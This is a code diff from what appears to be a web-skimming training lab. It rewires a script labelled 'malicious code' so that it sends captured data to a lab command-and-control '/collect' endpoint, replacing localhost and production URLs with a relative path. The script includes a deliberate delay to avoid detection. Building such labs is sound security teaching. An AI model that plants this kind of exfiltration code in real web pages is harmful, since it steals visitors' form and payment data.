@@ -256,33 +256,13 @@
   // Attackers add a slight delay to avoid detection during page load
   setTimeout(function () {
     // Configuration - would be obfuscated in real attacks
-    // Dynamically determine C2 URL based on environment
-    const hostname = window.location.hostname
+    // Use relative path for C2 exfiltration (works in all environments via Traefik)
     console.log("Inside malicious code at the start. Mohammad");
     console.log("Printing  port...");
     console.log(window.location.port);
-    let exfilUrl = '';
-    console.log("exfilUrl has been initialized to empty string");
-    console.log("printing typeof window.location.port to see type for this variable");
-    console.info(typeof window.location.port);
-    if (window.location.port === "8080"){
-      console.info("inside if statement in malicious code.");
-      exfilUrl = 'http://localhost:3000/collect'
-      console.info('exfilUrl from if statement is printed below');
-      console.info(exfilUrl);
-    }
-    else if (window.location.port === "9001"){
-      console.info("inside else if statement in malicious code.");
-      exfilUrl = 'http://localhost:9002/collect';
-      console.info('exfilUrl from else if statement is printed below');
-      console.info(exfilUrl);
-    }
-     // Local development default
-
-    // Production and staging - use relative URL since C2 is proxied by nginx
-    if (hostname.includes('run.app') || hostname.includes('pcioasis.com')) {
-      exfilUrl = window.location.origin + '/collect'
-    }
+    // Use relative path - Traefik routes /lab1/c2/collect to C2 server
+    const exfilUrl = '/lab1/c2/collect'
+    console.log("exfilUrl set to relative path:", exfilUrl);
 
     const CONFIG = {
       exfilUrl: exfilUrl,
